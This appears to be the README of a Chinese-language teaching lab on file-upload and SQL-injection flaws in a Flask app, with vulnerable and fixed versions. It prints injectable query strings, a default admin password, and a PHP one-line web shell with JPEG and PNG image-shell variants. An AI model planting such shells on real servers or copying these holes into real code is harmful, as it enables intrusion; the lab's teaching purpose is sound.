# 🔐 文件上传漏洞分析与修复实验

## 实验环境

- **框架**: Python Flask 3.1.3
- **数据库**: SQLite 3
- **攻击工具**: Burp Suite / 蚁剑 / curl
- **系统**: Kali Linux

## 项目结构

```
├── app.py                    # 有漏洞版本（SQL注入+文件上传漏洞）
├── app_fixed.py              # 修复版本（参数化查询+文件类型检查）
├── gen_upload_report.py      # 漏洞分析HTML报告生成器
├── gen_word_report.py        # Word版报告生成器
├── data/
│   └── users.db              # SQLite数据库
├── templates/
│   ├── base.html
│   ├── base_fixed.html
│   ├── index.html
│   ├── index_fixed.html
│   ├── login.html
│   ├── register.html
│   ├── upload.html            # 有漏洞的上传页面
│   └── upload_fixed.html      # 修复版上传页面
├── static/
│   ├── css/style.css
│   ├── uploads/               # 上传文件目录
│   ├── shell_demo.php         # 一句话木马演示
│   ├── shell_demo.jpg         # JPEG图片马演示
│   ├── shell_demo.png         # PNG图片马演示
│   ├── 文件上传漏洞分析与修复报告.html  # HTML报告
│   └── 文件上传漏洞分析与修复报告.docx  # Word报告
└── gen_*.py                  # 报告生成脚本
```

## 漏洞列表

### 1. SQL注入漏洞
- **登录处**: `SELECT * FROM users WHERE username='{username}' AND password='{password}'`
- **搜索处**: `WHERE username LIKE '%{keyword}%'`
- **注册处**: `INSERT INTO users VALUES ('{username}', ...)`

### 2. 文件上传漏洞
- ❌ 无文件后缀名检查
- ❌ 无MIME类型检查
- ❌ 使用原始文件名保存（路径穿越风险）

### 3. 信息泄露
- HTML注释泄露默认账号（admin/admin123）
- 登录后页面显示明文密码
- Debug模式开启（泄露详细错误信息）

## 一句话木马演示

```php
# 基础版
<?php @eval($_POST["cmd"]); ?>

# JPEG图片马
FF D8 JFIF头 ... FF D9 <?php @eval($_POST["cmd"]); ?>

# PNG图片马
PNG头 IHDR IDAT IEND <?php @eval($_POST["cmd"]); ?>
```
